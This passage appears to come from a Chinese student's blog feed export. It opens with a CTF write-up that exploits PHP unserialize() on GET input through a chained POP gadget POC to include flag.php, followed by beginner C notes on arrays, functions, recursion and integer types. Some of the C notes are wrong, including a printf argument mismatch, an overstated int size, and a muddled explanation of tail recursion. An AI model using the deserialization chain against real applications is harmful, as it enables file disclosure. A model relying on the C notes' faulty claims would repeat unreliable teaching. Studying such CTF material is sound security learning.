class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>首先这类题一定是要先找到能进行命令执行或文件包含的地方,那么我们发现在Modifier类中有一个方法内有可以产生文件包含漏洞的函数include(),那我们的思路就是想办法触发魔术方法来调用append方法,并且传给value的值为’flag.php’</p></li><li><p>不难发现我们需要触发__invoke()这个魔术方法来调用append方法,并且传给value的值为这个类中的var值,那么后面的poc中var值就要为’flag.php’,但要触发这个魔术方法,需要将对象当作函数调用</p></li><li><p>那么接下来为了触发__invoke()魔术方法,如何将Modifier对象当作函数调用,观察接下来的代码,我们发现在Test类中的__get()魔术方法中return部分可以实现把对象当作函数调用,且需要将赋给$function的$p为Modifier实例,即$p&#x3D;new Modifier(),那么触发这个魔术方法需要调用这个类中属性不存在或不可访问属性的成员</p></li><li><p>继续,为了触发__get()魔术方法,我们要继续利用其他方法来实现触发,发现在Show这个类中的__toString()魔术方法中存在连续的引用,那么我们可以将这个类中的$str的值赋为Test对象,因此这个魔术方法内的这句话return $this-&gt;str-&gt;source;就成为了调用Test对象中的source成员了,又因为Test类中没有source这个成员,所以实现引用Test对象中不存在的成员,触发__get()魔术方法,那么又该如何触发__toString()魔术方法来实现这样的过程呢</p></li><li><p>那么要触发__toString()魔术方法,要将Tset对象作为字符串调用,依旧是去寻找能实现这种过程的部分,发现在这个类中存在__wakeup()魔术方法,其中我们可以利用echo函数来将Test对象作为字符串调用,那么只需要将source值赋为new Test(),并触发__wakeup()魔术方法就能实现,最后一步就是触发这个魔术方法了</p></li><li><p>最后,只需要进行反序列化操作,__wakeup魔术方法就会被调用,那么层层递推,就实现我们的需要了</p></li></ol><p><strong>总结一下</strong>:通过上面的分析,最后大致总结下来就是一个这样的过程:</p><p>分析后编辑好POC并进行序列化(url编码) <strong>&gt;&gt;</strong> 将结果传参,进行反序列化 <strong>&gt;&gt;</strong> 触发__wakeup <strong>&gt;&gt;</strong> 触发__toString <strong>&gt;&gt;</strong> 触发__get <strong>&gt;&gt;</strong> 触发__invoke <strong>&gt;&gt;</strong> 最后成功利用文件包含,得到答案</p><p>这种环环相扣,层层递进的过程就是构造pop链,最后展示一下POC以更好理解:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mod</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;p=<span class="variable">$mod</span>;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;source = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str=<span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>之前做到一题发现自己知识的缺口,现在做出补充</p><p>在php反序列化时如果要把一个类中成员的值赋给另一个成员需要用到引用符,和C语言取地址意义相似,例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">CLazz</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;b = &amp;<span class="variable">$c</span>-&gt;a;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记4</title>
      <link href="/2023/10/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-25-%E7%AC%94%E8%AE%B04/"/>
      <url>/2023/10/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-25-%E7%AC%94%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><p>命名相同类型的有限变量的集合，该名称是一个数组名称。</p></li><li><p>组成数组的变量称为数组的元素。</p></li></ul><h3 id="声明和访问"><a href="#声明和访问" class="headerlink" title="声明和访问"></a>声明和访问</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><p><strong>定义一个数组时所需的基本语法</strong></p><p>int scores[5]</p><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a><strong>初始化</strong></h4><p>int scores[5] &#x3D; {90, 85, 80, 75, 70}；</p><p><strong>初始化部分元素</strong></p><p>int scores[5] &#x3D; {90, 85};</p><p>初始化第一，第二元素，其余为0</p><p><strong>让编译器自动推断大小</strong></p><p>int scores[] &#x3D; {90, 85, 80, 75, 70};</p><h4 id="使用索引访问元素"><a href="#使用索引访问元素" class="headerlink" title="使用索引访问元素"></a><strong>使用索引访问元素</strong></h4><p>printf(“%d”, scores[0]); &#x2F;&#x2F; 输出90</p><p>pfor(int i&#x3D;0;i&lt;&#x3D;n;i++)<br>  printf(“%d”, scores[i]); &#x2F;&#x2F; 输出90</p><p><strong>注意点：数组的索引从0开始，超出数组范围的索引可能导致未定义的行为</strong></p><p><strong>用取模来实现下标循环</strong></p><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><p><strong>多维数组就像是个表格，矩阵，有行和列</strong></p><h4 id="初始化和声明"><a href="#初始化和声明" class="headerlink" title="初始化和声明"></a>初始化和声明</h4><p>声明一个3x4的二维数组<br> int a [3] [4];</p><p><strong>初始化</strong><br> int a[3] [4] &#x3D; {<br> {1, 2, 3, 4},<br> {5, 6, 7, 8},<br> {9, 10, 11, 12}<br> };</p><p><strong>访问元素</strong><br> printf(“%d”, a[1][2]); &#x2F;&#x2F; 输出7</p><p><strong>使用双重循环遍历</strong><br> for (int i &#x3D; 0; i &lt; 3; i++) {<br>  for (int j &#x3D; 0; j &lt; 4; j++){</p><p>printf(“%d “, a[i][j]);</p><p> }</p><p>printf(“\n”);</p><p>}</p><p><strong>还可以用取模的方法只用一个循环遍历</strong></p><h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>字符数组可以用来存储一个字符序列。例如：char name[5];</p><h4 id="字符串与字符数组"><a href="#字符串与字符数组" class="headerlink" title="字符串与字符数组"></a>字符串与字符数组</h4><p>在C中，字符串其实是一个字符数组，其中每个字符都按顺序存储，而且最后有一个额外的字符‘\0’，表示字符串的结束。这就是为什么字符串”John”实际上在内存中占据5个字符的空间：’J’, ‘o’, ‘h’, ‘n’, 和 ‘\0’。</p><h4 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> name[] = <span class="string">&quot;John&quot;</span>; </span><br><span class="line"><span class="type">char</span> name[<span class="number">5</span>] = <span class="string">&quot;John&quot;</span>;</span><br></pre></td></tr></table></figure><p>元素为 ‘J’ ‘o’ ‘h’ ‘n’ ‘\0’</p><h4 id="访问和修改字符数组"><a href="#访问和修改字符数组" class="headerlink" title="访问和修改字符数组"></a>访问和修改字符数组</h4><p>printf(“%c\n”, name[2]); &#x2F;&#x2F; 输出h</p><p>pprintf(“%s\n”, name);&#x2F;&#x2F; 输出 John</p><p>name[2] &#x3D; ‘a’; &#x2F;&#x2F;其余元素不变</p><h4 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h4><p>头文件&lt;string.h&gt;</p><p><strong>strlen(): 返回字符串的长度（不包括结束字符\0）。</strong></p><p><strong>strcpy将一个字符串拷贝给另一个字符串<br>返回值会返回被传的字符串</strong></p><p><strong>strcat(): 连接两个字符串。</strong></p><p><strong>strcmp(): 比较两个字符串。</strong></p><p><strong>基本形式为strcmp(str1,str2)，若str1&#x3D;str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数,返回值只与第一个不同字符有关，与第二个不同字符无关</strong></p><p><strong>在字符串中找一个字符strchr（左到右），strrchr(从右到左)</strong></p><p><strong>返回值为指针，即第一次出现的位置，返回null为没找到</strong></p><p>若想找第二个字符，以下为一种方法（左到右）：</p><p>（p为指针）</p><p>p&#x3D;strchr(str,’a’);<br>p&#x3D;strchr(p+1,’a’);</p><p><strong>strstr字符串内找字符串</strong><br><strong>strcasestr找的过程内忽略大小写</strong></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>函数是C语言中的一个基本构建块，用于封装代码以执行特定的任务</p><p>函数是为执行特定任务而组织的一段程序代码,它可以有输入（称为参数）和输出（返回值）</p><p>函数就是把实现某一个功能的所有的代码打成一个包，每次需要这个功能的时候不用重复去写实现这个功能的代码，而是使用函数</p><h3 id="声明与访问"><a href="#声明与访问" class="headerlink" title="声明与访问"></a>声明与访问</h3><p><strong>声明：函数声明告诉编译器函数的名称、返回类型和参数。</strong></p><p> int add(int a,int b);</p><p><strong>定义：函数的定义提供函数的实际实现</strong><br> int add(int a, int b) {<br>  return a + b;<br> }</p><p><strong>调用</strong><br> int sum &#x3D; add(5, 6);</p><p><strong>函数的参数</strong><br> <strong>按值传递：</strong>这是C语言的默认参数传递方式，函数接收参数的值，对参数的修改不会影响调用者。</p><p><strong>按引用传递</strong>：C语言通过传递指针来实现这一点。函数接收参数地址的指针，因此可以修改原始数据。</p><p><strong>返回值</strong></p><p> 函数可以返回一个值给调用栈，这可以通过’return’语句实现</p><h3 id="形参与实参"><a href="#形参与实参" class="headerlink" title="形参与实参"></a>形参与实参</h3><p><strong>形参</strong><br> int add(int a, int b) {<br>  return a + b;<br> }</p><p><strong>实参</strong><br> int sum &#x3D; add(5, 6);</p><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line"><span class="type">int</span> tmp = x;</span><br><span class="line">x = y;</span><br><span class="line">y = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">4</span>, b = <span class="number">51</span>, c = <span class="number">14</span>, d = <span class="number">1</span>;</span><br><span class="line">swap (a, d);</span><br><span class="line">swap (c, b);</span><br><span class="line">swap (b, c);</span><br><span class="line">swap (c, d);</span><br><span class="line">swap (b, d);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, a, b, c, d);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该函数无返回值，形参改变不影响实参，所以a,b,c,d还是原值</p><p><strong>数组做参数</strong></p><p>数组做参数时，传达的是一个地址</p><p>可在函数内通过对地址上的形参进行修改来修改实参</p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在一个函数中反复调用它自身</p><h4 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> aux)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %c -&gt; %c\n&quot;</span>, from, to);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hanoi(n - <span class="number">1</span>, from, aux, to);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, n, from, to);</span><br><span class="line">    hanoi(n - <span class="number">1</span>, aux, to, from);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">4</span>; <span class="comment">// Number of disks</span></span><br><span class="line">    hanoi(n, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;B&#x27;</span>);  <span class="comment">// A, B and C are names of rods</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>当n个盘的最大的盘在底部时，可将其看成n-1的盘进行移动</p><p>三个柱子，分别为  <strong>出发地，中转地，目的地</strong></p><p>每次最大盘到达目的地时，随后看成n-1盘</p><p> <strong>出发地，中转地，目的地</strong>改变</p><p>如此递归</p><h4 id="非尾递归与尾递归"><a href="#非尾递归与尾递归" class="headerlink" title="非尾递归与尾递归"></a>非尾递归与尾递归</h4><p><strong>非尾递归</strong></p><p>非尾递归意味着递归调用不是函数的最后一个操作，递归调用的结果通常需要进一步处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> duration;</span><br><span class="line"><span class="type">clock_t</span>  start, stop;</span><br><span class="line">    <span class="type">int</span> result; </span><br><span class="line">    start = clock();</span><br><span class="line">result = fib(<span class="number">40</span>); </span><br><span class="line">    stop = clock(); <span class="comment">//结束计时</span></span><br><span class="line">    duration = ((<span class="type">double</span>)(stop - start))/CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>,duration); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>尾递归</strong></p><p>尾递归意味着递归调用是函数的最后一个操作。编译器能够优化尾递归，将其转换为迭代调用，这样可以避免栈溢出的问题并提高效率。</p><p>尾递归效率比非尾递归快的原因</p><p>非尾递归过程中对一相同过程进行了多次反复运行</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记3</title>
      <link href="/2023/10/22/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-22-%E7%AC%94%E8%AE%B03/"/>
      <url>/2023/10/22/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-22-%E7%AC%94%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>计算机要处理的数据(诸如数字,文字,符号,图形,音频,视频等)是以二进制的形式存放在内存中的,我们将八个比特(Bit)称为一个字节(Byte),并将字节作为最小的可操作单元</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>现实生活中我们会找一个小箱子来存放物品，一来显得不那么凌乱，二来方便以后找到。计算机也是这个道理，我们需要先在内存中找一块区域，规定用它来存放整数，并起一个好记的名字，方便以后查找。这块区域就是“小箱子”，我们可以把整数放进去了。 C语言中这样在内存中找一块区域：</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">123</span>;</span><br></pre></td></tr></table></figure><p>int，它是 Integer 的简写，意思是整数。a 是我们给这块区域起的名字；当然也可以叫其他名字，例如 abc、mn123 等。 这个语句的意思是：在内存中找一块区域，命名为 a，用它来存放整数。</p><p>不过int a;仅仅是在内存中找了一块可以保存整数的区域，那么如何将 123、100、999 这样的数字放进去呢？ C语言中这样向内存中放整数：<br>&#x3D;是一个新符号，它在数学中叫“等于号”，例如 1+2&#x3D;3，但在C语言中，这个过程叫做赋值。赋值是指把数据放到内存的过程。 把上面的两个语句连起来：<br>就把 123 放到了一块叫做 a 的内存区域。</p><p>a 中的整数不是一成不变的，只要我们需要，随时可以更改。更改的方式就是再次赋值，例如：<br>第二次赋值，会把第一次的数据覆盖掉，也就是说，a 中最后的值是9999，123、1000 已经不存在了，再也找不回来了。 因为 a 的值可以改变，所以我们给它起了一个形象的名字，叫做变量。<br>int a;创造了一个变量 a，我们把这个过程叫做变量定义。<br> a&#x3D;123;把 123 交给了变量 a，我们把这个过程叫做给变量赋值；</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>内存中的数据有多种解释方式，使用之前必须要确定；上面的int a;就表明，这份数据是整数，不能理解为像素、声音等。</p><p>顾名思义，数据类型用来说明数据的类型，确定了数据的解释方式，让计算机和程序员不会产生歧义。在C语言中，有多种数据类型，例如：</p><ul><li><p>字符型: char</p></li><li><p>短整形: short</p></li><li><p>整形: int</p></li><li><p>长整型: long</p></li><li><p>单精度浮点型: float</p></li><li><p>双精度浮点型: double</p></li><li><p>无类型: void</p></li></ul><p>连续定义多个变量   为了让程序的书写更加简洁，C语言支持多个变量的连续定义。</p><h3 id="数据的长度"><a href="#数据的长度" class="headerlink" title="数据的长度"></a>数据的长度</h3><p>所谓数据长度，是指数据占用多少个字节。占用的字节越多，能存储的数据就越多，对于数字来说，值就会更大，反之能存储的数据就有限。 多个数据在内存中是连续存储的，彼此之间没有明显的界限，如果不明确指明数据的长度，计算机就不知道何时存取结束。</p><p>数据类型除了指明数据的解释方式，还指明了数据的长度。因为在C语言中，每一种数据类型所占用的字节数都是固定的，知道了数据类型，也就知道了数据的长度。 在32位环境中，各种数据类型的长度(字节)一般如下：</p><ul><li><p>字符型char: 1</p></li><li><p>短整形short: 2</p></li><li><p>整形int: 4</p></li><li><p>长整型long: 4</p></li><li><p>单精度浮点型float: 4</p></li><li><p>双精度浮点型double: 8</p></li></ul><p>数据是放在内存中的，在内存中存取数据要明确三件事情：数据存储在哪里、数据的长度以及数据的处理方式。 变量名不仅仅是为数据起了一个好记的名字，还告诉我们数据存储在哪里，使用数据时，只要提供变量名即可；而数据类型则指明了数据的长度和处理方式。所以诸如int n;、char c;、float money;这样的形式就确定了数据在内存中的所有要素。 C语言提供的多种数据类型让程序更加灵活和高效，同时也增加了学习成本。而有些编程语言，例如：PHP，JavaScript等，在定义变量时不需要指明数据类型，编译器会根据赋值情况自动推演出数据类型，更加智能。 除了C语言，Java、C++、C#,等在定义变量时也必须指明数据类型，这样的编程语言称为强类型语言。</p><p>而PHP、JavaScript等在定义变量时不必指明数据类型，编译系统会自动推演，这样的编程语言称为弱类型语言。 强类型语言一旦确定了数据类型，就不能再赋给其他类型的数据，除非对数据类型进行转换。弱类型语言没有这种限制，一个变量，可以先赋给一个整数，然后再赋给一个字符串。 最后需要说明的是：数据类型只在定义变量时指明，而且必须指明；使用变量时无需再指明，因为此时的数据类型已经确定了。</p><h3 id="C语言中的整数（short-int-long）"><a href="#C语言中的整数（short-int-long）" class="headerlink" title="C语言中的整数（short,int,long）"></a>C语言中的整数（short,int,long）</h3><p>整数是编程中常用的一种数据，C语言通常使用int来定义整数（int 是 integer 的简写）。 在现代操作系统中，int 一般占用 4 个字节（Byte）的内存，共计 32 位（Bit）。如果不考虑正负数，当所有的位都为 1 时它的值最大，为 232-1 &#x3D; 4,294,967,295 ≈ 43亿，这是一个很大的数，实际开发中很少用到，而诸如 1、99、12098 等较小的数使用频率反而较高。 使用 4 个字节保存较小的整数绰绰有余，会空闲出两三个字节来，这些字节就白白浪费掉了，不能再被其他数据使用。现在个人电脑的内存都比较大了，配置低的也有 4G，浪费一些内存不会带来明显的损失；而在C语言被发明的早期，或者在单片机和嵌入式系统中，内存都是非常稀缺的资源，所有的程序都在尽力节省内存。</p><p>反过来说，43 亿虽然已经很大，但要表示全球人口数量还是不够，必须要让整数占用更多的内存，才能表示更大的值，比如占用 6 个字节或者 8 个字节。<br>int 是基本的整数类型，short 和 long 是在 int 的基础上进行的扩展，short 可以节省内存，long 可以容纳更大的值。 short、int、long 是C语言中常见的整数类型，其中 int 称为整型，short 称为短整型，long 称为长整型。<br>整型的长度</p><h3 id="整形的长度"><a href="#整形的长度" class="headerlink" title="整形的长度"></a>整形的长度</h3><p>只有short 的长度是确定的，是两个字节，而 int 和 long 的长度无法确定，在不同的环境下有不同的表现。<br>一种数据类型占用的字节数，称为该数据类型的长度。例如，short 占用 2 个字节的内存，那么它的长度就是 2。<br>实际情况也确实如此，C语言并没有严格规定 short、int、long 的长度，只做了宽泛的限制：</p><ul><li><p>short 至少占用 2 个字节。</p></li><li><p>int 在32 位环境下机器字长为 4 字节，64 位环境下机器字长为 8 字节。</p></li><li><p>short 的长度不能大于 int，long 的长度不能小于 int。</p></li></ul><p>sizeof 用来获取某个数据类型或变量所占用的字节数，如果后面跟的是变量名称，那么可以省略( )，如果跟的是数据类型，就必须带上( )。 需要注意的是，sizeof 是C语言中的操作符，不是函数，所以可以不带( )。</p><h3 id="C语言中的二进制数、八进制数和十六进制数"><a href="#C语言中的二进制数、八进制数和十六进制数" class="headerlink" title="C语言中的二进制数、八进制数和十六进制数"></a>C语言中的二进制数、八进制数和十六进制数</h3><ol><li>二进制<br> 二进制由 0 和 1 两个数字组成，使用时必须以0b或0B（不区分大小写）开头，例如：</li><li>八进制<br> 八进制由 0~7 八个数字组成，使用时必须以0开头（注意是数字 0，不是字母 o），例如：</li><li>十六进制<br> 十六进制由数字 09、字母 AF 或 a~f（不区分大小写）组成，使用时必须以0x或0X（不区分大小写）开头，例如：</li><li>十进制<br> 十进制由 0~9 十个数字组成，没有任何前缀，和我们平时的书写格式一样，不再赘述。</li></ol><h4 id="二进制数、八进制数和十六进制数的输出"><a href="#二进制数、八进制数和十六进制数的输出" class="headerlink" title="二进制数、八进制数和十六进制数的输出"></a>二进制数、八进制数和十六进制数的输出</h4><p>C语言中常用的整数有 short、int 和 long 三种类型，通过 printf 函数，可以将它们以八进制、十进制和十六进制的形式输出。<br>下表列出了不同类型的整数、以不同进制的形式输出时对应的格式控制符：</p><table><thead><tr><th align="left">进制&#x2F;数据类型</th><th align="left">short</th><th align="left">int</th><th align="left">long</th></tr></thead><tbody><tr><td align="left">八进制</td><td align="left">%ho</td><td align="left">%o</td><td align="left">%lo</td></tr><tr><td align="left">十进制</td><td align="left">%hd</td><td align="left">%d</td><td align="left">%ld</td></tr><tr><td align="left">十六进制</td><td align="left">%hx 或者 %hX</td><td align="left">%x 或者 %X</td><td align="left">%lx 或者 